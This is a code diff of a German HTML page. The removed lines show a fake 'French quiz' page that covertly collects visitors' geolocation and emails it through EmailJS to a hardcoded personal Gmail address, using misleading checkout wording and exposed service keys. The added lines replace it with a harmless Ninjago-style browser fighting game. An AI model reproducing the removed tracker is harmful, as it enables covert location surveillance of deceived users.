@@ -3,95 +3,659 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bestellung wird bearbeitet</title>
+<title>Ninjago Arena: Wellenkampf</title>
 <style>
+    :root {
+        --bg: #10131a;
+        --panel: rgba(18, 22, 34, 0.92);
+        --accent: #f5d000;
+        --danger: #f04848;
+        --good: #4ad66d;
+        --blue: #4aa3ff;
+        --text: #f2f5ff;
+    }
+
+    * {
+        box-sizing: border-box;
+        font-family: "Trebuchet MS", "Segoe UI", sans-serif;
+    }
+
     body {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        font-family: Arial, sans-serif;
-        background-color: #f0f0f5;
-        text-align: center;
+        margin: 0;
+        background: radial-gradient(circle at top, #1e2433, #0d1119 70%);
+        color: var(--text);
     }
-    .container {
-        background-color: #ffffff;
+
+    .wrapper {
+        display: grid;
+        grid-template-columns: minmax(280px, 360px) 1fr;
+        gap: 24px;
+        padding: 24px;
+        min-height: 100vh;
+    }
+
+    .panel {
+        background: var(--panel);
+        border-radius: 20px;
         padding: 20px;
-        border-radius: 10px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
+        border: 1px solid rgba(255, 255, 255, 0.1);
     }
-    button {
-        padding: 10px 20px;
-        font-size: 1em;
-        background-color: #4caf50;
-        color: white;
+
+    h1 {
+        margin-top: 0;
+        font-size: 1.8rem;
+    }
+
+    .tag {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.85rem;
+        padding: 4px 10px;
+        border-radius: 999px;
+        background: rgba(255, 255, 255, 0.08);
+        margin-right: 6px;
+    }
+
+    .stat {
+        margin: 10px 0;
+    }
+
+    .stat label {
+        font-size: 0.85rem;
+        display: block;
+        margin-bottom: 4px;
+        color: rgba(255, 255, 255, 0.7);
+    }
+
+    .bar {
+        height: 14px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 999px;
+        overflow: hidden;
+    }
+
+    .bar span {
+        display: block;
+        height: 100%;
+        background: linear-gradient(90deg, var(--accent), #f6a700);
+        width: 60%;
+        transition: width 0.2s ease;
+    }
+
+    .bar.green span {
+        background: linear-gradient(90deg, var(--good), #7dff9c);
+    }
+
+    .bar.blue span {
+        background: linear-gradient(90deg, var(--blue), #6dd2ff);
+    }
+
+    .button {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 10px 14px;
+        border-radius: 12px;
         border: none;
-        border-radius: 5px;
+        background: #2c3242;
+        color: var(--text);
+        font-weight: 600;
         cursor: pointer;
-        transition: background-color 0.3s;
+        transition: transform 0.2s ease, background 0.2s ease;
     }
-    button:hover {
-        background-color: #45a049;
+
+    .button:hover {
+        background: #3a4156;
+        transform: translateY(-1px);
+    }
+
+    .button.primary {
+        background: var(--accent);
+        color: #1a1a1a;
+    }
+
+    .button.primary:hover {
+        background: #ffdf2b;
+    }
+
+    .button.danger {
+        background: var(--danger);
+    }
+
+    .controls {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+        margin-top: 12px;
+    }
+
+    .grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+    }
+
+    .arena-wrapper {
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
+    }
+
+    canvas {
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(circle at center, #f0c75e 0%, #b37d2e 65%, #7a4c10 100%);
+        border-radius: 24px;
+        border: 6px solid rgba(0, 0, 0, 0.3);
+        box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .arena-shell {
+        position: relative;
+        padding: 16px;
+        background: linear-gradient(135deg, #2f3342, #1a1f2b);
+        border-radius: 28px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .arena-label {
+        position: absolute;
+        top: 18px;
+        left: 18px;
+        background: rgba(0, 0, 0, 0.6);
+        padding: 6px 12px;
+        border-radius: 999px;
+        font-size: 0.85rem;
+    }
+
+    .hint {
+        font-size: 0.9rem;
+        color: rgba(255, 255, 255, 0.7);
+    }
+
+    .log {
+        height: 160px;
+        overflow-y: auto;
+        padding-right: 6px;
+        font-size: 0.85rem;
+        color: rgba(255, 255, 255, 0.75);
+    }
+
+    .log p {
+        margin: 6px 0;
+    }
+
+    .footer {
+        font-size: 0.75rem;
+        color: rgba(255, 255, 255, 0.5);
+        text-align: center;
+        margin-top: 12px;
+    }
+
+    @media (max-width: 960px) {
+        .wrapper {
+            grid-template-columns: 1fr;
+        }
     }
 </style>
-<!-- Verwende die aktualisierte EmailJS-Bibliothek -->
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-    // EmailJS initialisieren mit deinem Public Key
-    (function(){
-        emailjs.init("Ko_3lmYK2sGcV4BaV"); // Ersetze mit deinem Public Key
-    })();
+</head>
+<body>
+<div class="wrapper">
+    <div class="panel">
+        <h1>Ninjago Arena: Wellenkampf</h1>
+        <div>
+            <span class="tag">LEGO-Look</span>
+            <span class="tag">Spinjitzu</span>
+            <span class="tag">Wellenmodus</span>
+        </div>
 
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendEmail, showError);
-        } else {
-            console.log("Geolocation wird von diesem Browser nicht unterstützt.");
+        <div class="stat">
+            <label>Gesundheit</label>
+            <div class="bar green"><span id="healthBar"></span></div>
+        </div>
+        <div class="stat">
+            <label>Spinjitzu-Leiste</label>
+            <div class="bar blue"><span id="spinBar"></span></div>
+        </div>
+        <div class="stat">
+            <label>Studs (LEGO-Währung)</label>
+            <strong id="studs">0</strong>
+        </div>
+
+        <div class="grid">
+            <div class="panel" style="padding: 12px;">
+                <strong>Modus</strong>
+                <p id="mode">Training</p>
+                <button class="button" onclick="setMode('training')">Training</button>
+                <button class="button" onclick="setMode('tournament')">Das Turnier</button>
+                <button class="button" onclick="setMode('endless')">Endlos</button>
+            </div>
+            <div class="panel" style="padding: 12px;">
+                <strong>Ninja wählen</strong>
+                <select id="ninjaSelect" class="button" style="width: 100%;">
+                    <option value="Kai">Kai (Feuer)</option>
+                    <option value="Jay">Jay (Blitz)</option>
+                    <option value="Cole">Cole (Erde)</option>
+                    <option value="Zane">Zane (Eis)</option>
+                    <option value="Lloyd">Lloyd (Energie)</option>
+                </select>
+                <div class="controls">
+                    <button class="button primary" onclick="upgrade('health')">+ Gesundheit</button>
+                    <button class="button primary" onclick="upgrade('damage')">+ Schaden</button>
+                    <button class="button primary" onclick="upgrade('speed')">+ Tempo</button>
+                    <button class="button danger" onclick="resetRun()">Neu starten</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel" style="margin-top: 14px;">
+            <strong>Steuerung</strong>
+            <ul>
+                <li>WASD / Pfeile: Bewegung (virtueller Joystick)</li>
+                <li>A: Angriff (Combo)</li>
+                <li>B: Sprungangriff</li>
+                <li>Shift: Blocken</li>
+                <li>Leertaste: Spinjitzu, wenn Leiste voll ist</li>
+            </ul>
+        </div>
+
+        <div class="panel" style="margin-top: 14px;">
+            <strong>Logbuch</strong>
+            <div class="log" id="log"></div>
+        </div>
+    </div>
+
+    <div class="arena-wrapper">
+        <div class="arena-shell">
+            <span class="arena-label" id="arenaLabel">Arena von Meister Chen</span>
+            <canvas id="arena" width="900" height="600"></canvas>
+        </div>
+        <div class="panel">
+            <div class="controls">
+                <button class="button" onclick="triggerAttack()">A: Schlag</button>
+                <button class="button" onclick="triggerJump()">B: Sprung</button>
+                <button class="button" onclick="toggleBlock()">Blocken</button>
+                <button class="button primary" onclick="triggerSpin()">Spinjitzu</button>
+            </div>
+            <p class="hint">Besiege Wellen, sammle Studs, und schalte neue Kämpfer frei. Gegner zerfallen in Bricks!</p>
+        </div>
+        <div class="footer">Dieses Minispiel ist ein spielbarer HTML-Prototyp inspiriert von LEGO Ninjago: Shadow of Ronin.</div>
+    </div>
+</div>
+
+<script>
+    const canvas = document.getElementById("arena");
+    const ctx = canvas.getContext("2d");
+    const healthBar = document.getElementById("healthBar");
+    const spinBar = document.getElementById("spinBar");
+    const studsEl = document.getElementById("studs");
+    const logEl = document.getElementById("log");
+    const modeEl = document.getElementById("mode");
+    const arenaLabel = document.getElementById("arenaLabel");
+
+    const state = {
+        mode: "training",
+        wave: 1,
+        studs: 0,
+        spin: 0,
+        player: {
+            name: "Kai",
+            x: 450,
+            y: 320,
+            hp: 100,
+            maxHp: 100,
+            damage: 12,
+            speed: 2.4,
+            blocking: false,
+            jumping: false,
+            combo: 0
+        },
+        enemies: [],
+        effects: [],
+        lastSpawn: 0,
+        bossActive: false,
+        lastUpdate: performance.now()
+    };
+
+    const keys = new Set();
+
+    function log(message) {
+        const entry = document.createElement("p");
+        entry.textContent = message;
+        logEl.prepend(entry);
+        if (logEl.children.length > 10) {
+            logEl.removeChild(logEl.lastChild);
         }
     }
 
-    function sendEmail(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        console.log("Sende Produkt/Dienstleistung:", latitude, longitude);
+    function setMode(mode) {
+        state.mode = mode;
+        state.wave = 1;
+        state.bossActive = false;
+        state.enemies = [];
+        state.effects = [];
+        arenaLabel.textContent = mode === "training" ? "Trainingdojo" : "Arena von Meister Chen";
+        modeEl.textContent = mode === "training" ? "Training" : mode === "tournament" ? "Das Turnier" : "Endlos";
+        log(`Modus gewechselt: ${modeEl.textContent}`);
+        spawnWave();
+    }
 
-        // E-Mail-Versand über EmailJS
-        emailjs.send("service_5nak3uh", "template_0xwklu6", {
-            latitude: latitude,
-            longitude: longitude,
-            user_email: "voegeli05@gmail.com" // Empfängeradresse
-        }).then(function(response) {
-            console.log("Kauf erfolgreich bestätigt.");
-            // Weiterleitung zur Bestätigungsseite nach erfolgreichem Versand
-            window.location.href = "bestellbestaetigung.html"; // Ersetze mit dem tatsächlichen Pfad zur Bestätigungsseite
-        }, function(error) {
-            console.error("Fehler beim Checkout:", error);
+    function resetRun() {
+        state.player.hp = state.player.maxHp;
+        state.spin = 0;
+        state.studs = 0;
+        state.wave = 1;
+        state.enemies = [];
+        state.effects = [];
+        state.bossActive = false;
+        log("Run zurückgesetzt. Meister Chen erwartet dich!");
+        spawnWave();
+    }
+
+    function upgrade(stat) {
+        if (state.studs < 1000) {
+            log("Nicht genug Studs (1000 benötigt).");
+            return;
+        }
+        state.studs -= 1000;
+        if (stat === "health") {
+            state.player.maxHp += 20;
+            state.player.hp += 20;
+        }
+        if (stat === "damage") {
+            state.player.damage += 4;
+        }
+        if (stat === "speed") {
+            state.player.speed += 0.3;
+        }
+        log(`Upgrade gekauft: ${stat}`);
+    }
+
+    function createEnemy(type) {
+        const base = {
+            x: Math.random() * 760 + 70,
+            y: Math.random() * 460 + 70,
+            hp: 30,
+            speed: 1.4,
+            damage: 8,
+            type,
+            phase: 0,
+            rangedCooldown: 0
+        };
+        if (type === "ranged") {
+            base.hp = 25;
+            base.speed = 1.2;
+            base.damage = 10;
+        }
+        if (type === "boss") {
+            base.hp = 120;
+            base.speed = 1.1;
+            base.damage = 16;
+        }
+        return base;
+    }
+
+    function spawnWave() {
+        state.enemies = [];
+        const count = state.mode === "training" ? 2 : state.mode === "tournament" ? 4 + state.wave : 5 + state.wave;
+        for (let i = 0; i < count; i++) {
+            const typeChance = Math.random();
+            const type = typeChance > 0.8 ? "ranged" : "melee";
+            state.enemies.push(createEnemy(type));
+        }
+        if (state.mode !== "training" && state.wave % 3 === 0) {
+            state.enemies.push(createEnemy("boss"));
+            state.bossActive = true;
+            log("Bosswelle! Der Elementarmeister betritt die Arena.");
+        }
+        log(`Welle ${state.wave} gestartet.`);
+    }
+
+    function spawnBricks(x, y, color) {
+        for (let i = 0; i < 8; i++) {
+            state.effects.push({
+                x,
+                y,
+                vx: (Math.random() - 0.5) * 4,
+                vy: (Math.random() - 0.5) * 4,
+                life: 40,
+                color
+            });
+        }
+    }
+
+    function triggerAttack() {
+        state.player.combo = (state.player.combo + 1) % 3;
+        const radius = 80;
+        let hit = false;
+        state.enemies.forEach(enemy => {
+            const dist = Math.hypot(enemy.x - state.player.x, enemy.y - state.player.y);
+            if (dist < radius) {
+                enemy.hp -= state.player.damage + state.player.combo * 2;
+                spawnBricks(enemy.x, enemy.y, "#ffd26a");
+                hit = true;
+            }
+        });
+        if (hit) {
+            state.spin = Math.min(100, state.spin + 8);
+            log("Treffer! Combo steigt.");
+        }
+    }
+
+    function triggerJump() {
+        if (!state.player.jumping) {
+            state.player.jumping = true;
+            setTimeout(() => {
+                state.player.jumping = false;
+            }, 500);
+            triggerAttack();
+        }
+    }
+
+    function toggleBlock() {
+        state.player.blocking = !state.player.blocking;
+        log(state.player.blocking ? "Block aktiv." : "Block beendet.");
+    }
+
+    function triggerSpin() {
+        if (state.spin < 100) {
+            log("Spinjitzu noch nicht bereit.");
+            return;
+        }
+        state.spin = 0;
+        log("Spinjitzu entfesselt! Alles wird eingesaugt.");
+        state.enemies.forEach(enemy => {
+            enemy.hp -= 40;
+            spawnBricks(enemy.x, enemy.y, "#8fd3ff");
         });
     }
 
-    function showError(error) {
-        switch (error.code) {
-            case error.PERMISSION_DENIED:
-                console.log("Kauf abgelehnt.");
-                break;
-            case error.POSITION_UNAVAILABLE:
-                console.log("Kaufinformationen sind nicht verfügbar.");
-                break;
-            case error.TIMEOUT:
-                console.log("Dein Checkout ist abgelaufen.");
-                break;
-            case error.UNKNOWN_ERROR:
-                console.log("Ein unbekannter Fehler ist aufgetreten.");
-                break;
+    function update(delta) {
+        const speed = state.player.speed;
+        let vx = 0;
+        let vy = 0;
+        if (keys.has("ArrowUp") || keys.has("w")) vy -= speed;
+        if (keys.has("ArrowDown") || keys.has("s")) vy += speed;
+        if (keys.has("ArrowLeft") || keys.has("a")) vx -= speed;
+        if (keys.has("ArrowRight") || keys.has("d")) vx += speed;
+        state.player.x = Math.min(840, Math.max(60, state.player.x + vx));
+        state.player.y = Math.min(520, Math.max(60, state.player.y + vy));
+
+        state.enemies.forEach(enemy => {
+            if (enemy.type === "ranged") {
+                enemy.rangedCooldown -= delta;
+                const dist = Math.hypot(state.player.x - enemy.x, state.player.y - enemy.y);
+                if (dist < 160) {
+                    enemy.x -= (state.player.x - enemy.x) * 0.01;
+                    enemy.y -= (state.player.y - enemy.y) * 0.01;
+                } else {
+                    enemy.x += (state.player.x - enemy.x) * 0.005;
+                    enemy.y += (state.player.y - enemy.y) * 0.005;
+                }
+                if (enemy.rangedCooldown <= 0 && dist < 240) {
+                    enemy.rangedCooldown = 1200;
+                    state.effects.push({
+                        x: enemy.x,
+                        y: enemy.y,
+                        vx: (state.player.x - enemy.x) * 0.02,
+                        vy: (state.player.y - enemy.y) * 0.02,
+                        life: 60,
+                        color: "#ff9d8a",
+                        projectile: true
+                    });
+                }
+            } else {
+                const dx = state.player.x - enemy.x;
+                const dy = state.player.y - enemy.y;
+                const dist = Math.max(1, Math.hypot(dx, dy));
+                enemy.x += (dx / dist) * enemy.speed;
+                enemy.y += (dy / dist) * enemy.speed;
+            }
+
+            if (Math.hypot(enemy.x - state.player.x, enemy.y - state.player.y) < 34) {
+                const damage = state.player.blocking ? enemy.damage * 0.4 : enemy.damage;
+                state.player.hp -= damage * (delta / 700);
+            }
+        });
+
+        state.effects.forEach(effect => {
+            effect.x += effect.vx;
+            effect.y += effect.vy;
+            effect.life -= 1;
+            if (effect.projectile && Math.hypot(effect.x - state.player.x, effect.y - state.player.y) < 24) {
+                state.player.hp -= 8;
+                effect.life = 0;
+                spawnBricks(effect.x, effect.y, "#fff2a0");
+            }
+        });
+        state.effects = state.effects.filter(effect => effect.life > 0);
+
+        state.enemies = state.enemies.filter(enemy => {
+            if (enemy.hp <= 0) {
+                state.studs += enemy.type === "boss" ? 300 : 80;
+                spawnBricks(enemy.x, enemy.y, "#ffd26a");
+                return false;
+            }
+            return true;
+        });
+
+        if (state.enemies.length === 0 && state.mode !== "training") {
+            state.wave += 1;
+            spawnWave();
+        }
+
+        if (state.player.hp <= 0) {
+            state.player.hp = 0;
+            log("Du wurdest besiegt! Drücke Neu starten.");
+        }
+
+        updateUi();
+    }
+
+    function updateUi() {
+        healthBar.style.width = `${(state.player.hp / state.player.maxHp) * 100}%`;
+        spinBar.style.width = `${state.spin}%`;
+        studsEl.textContent = state.studs;
+    }
+
+    function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        ctx.fillStyle = "rgba(0, 0, 0, 0.2)";
+        ctx.beginPath();
+        ctx.ellipse(canvas.width / 2, canvas.height / 2, 360, 220, 0, 0, Math.PI * 2);
+        ctx.fill();
+
+        drawLantern(120, 90);
+        drawLantern(780, 90);
+        drawLantern(120, 510);
+        drawLantern(780, 510);
+
+        drawCharacter(state.player.x, state.player.y, state.player.name, "#f5d000", state.player.blocking);
+
+        state.enemies.forEach(enemy => {
+            const color = enemy.type === "boss" ? "#ff6b6b" : enemy.type === "ranged" ? "#8ad2ff" : "#9cff9c";
+            drawCharacter(enemy.x, enemy.y, enemy.type === "boss" ? "Boss" : "Kultist", color, false);
+        });
+
+        state.effects.forEach(effect => {
+            ctx.fillStyle = effect.color;
+            ctx.fillRect(effect.x, effect.y, 6, 6);
+        });
+
+        if (state.player.jumping) {
+            ctx.strokeStyle = "rgba(255, 255, 255, 0.7)";
+            ctx.beginPath();
+            ctx.arc(state.player.x, state.player.y, 40, 0, Math.PI * 2);
+            ctx.stroke();
+        }
+
+        if (state.spin >= 100) {
+            ctx.strokeStyle = "rgba(80, 200, 255, 0.8)";
+            ctx.lineWidth = 3;
+            ctx.beginPath();
+            ctx.arc(state.player.x, state.player.y, 60, 0, Math.PI * 2);
+            ctx.stroke();
         }
     }
+
+    function drawCharacter(x, y, label, color, blocking) {
+        ctx.fillStyle = color;
+        ctx.fillRect(x - 12, y - 22, 24, 26);
+        ctx.fillStyle = "#1d1d1d";
+        ctx.fillRect(x - 10, y - 40, 20, 16);
+        ctx.fillStyle = "#f5f5f5";
+        ctx.fillRect(x - 6, y - 34, 4, 4);
+        ctx.fillRect(x + 2, y - 34, 4, 4);
+        ctx.fillStyle = blocking ? "#ffd26a" : "#2c3242";
+        ctx.fillRect(x - 18, y - 16, 6, 20);
+        ctx.fillRect(x + 12, y - 16, 6, 20);
+        ctx.fillStyle = "#ffffff";
+        ctx.font = "12px Trebuchet MS";
+        ctx.textAlign = "center";
+        ctx.fillText(label, x, y + 32);
+    }
+
+    function drawLantern(x, y) {
+        ctx.fillStyle = "#f04848";
+        ctx.fillRect(x - 10, y - 20, 20, 26);
+        ctx.fillStyle = "#f5d000";
+        ctx.fillRect(x - 6, y - 12, 12, 12);
+    }
+
+    function loop(now) {
+        const delta = now - state.lastUpdate;
+        state.lastUpdate = now;
+        if (state.player.hp > 0) {
+            update(delta);
+        }
+        draw();
+        requestAnimationFrame(loop);
+    }
+
+    document.getElementById("ninjaSelect").addEventListener("change", event => {
+        state.player.name = event.target.value;
+        log(`Ninja gewechselt: ${state.player.name}`);
+    });
+
+    window.addEventListener("keydown", event => {
+        keys.add(event.key);
+        if (event.key === " ") triggerSpin();
+        if (event.key.toLowerCase() === "a") triggerAttack();
+        if (event.key.toLowerCase() === "b") triggerJump();
+        if (event.key === "Shift") toggleBlock();
+    });
+
+    window.addEventListener("keyup", event => {
+        keys.delete(event.key);
+    });
+
+    setMode("training");
+    updateUi();
+    requestAnimationFrame(loop);
 </script>
-</head>
-<body>
-<div class="container">
-    <h2>Französisch Quiz</h2>
-    <p>Klicken Sie auf den Button, um zum Französisch Quiz zu gelangen.</p>
-    <button onclick="getLocation()">Zum Quiz...</button>
-</div>
 </body>
 </html>
